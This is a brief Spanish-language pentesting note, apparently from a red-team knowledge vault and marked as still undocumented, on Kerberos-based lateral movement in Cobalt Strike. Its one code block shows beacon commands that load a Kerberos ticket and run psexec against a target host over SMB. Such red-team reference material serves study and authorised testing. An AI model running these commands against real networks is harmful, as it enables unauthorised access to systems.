---
title: Kerberos — Lateral Movement Services (Cobalt Strike)
tags: [kerberos, cobalt-strike, lateral-movement]
---

# Lateral Movement Services via Kerberos

> [!important] Pendiente de documentar — contenido vacío en el vault original.

## Concepto

Uso de tickets Kerberos para autenticación en servicios remotos durante movimiento lateral.

```
# Usar ticket en memory para acceso a servicio remoto
beacon> kerberos_ticket_use /tmp/ticket.ccache
beacon> jump psexec64 target-host smb
```

## Ver también
- [[05-ad-attacks/kerberos|Kerberos]]
- [[04-lateral-movement/user-impersonation/pass-the-ticket|Pass The Ticket]]
- [[05-ad-attacks/kerberos/s4u2self|S4U2Self]]
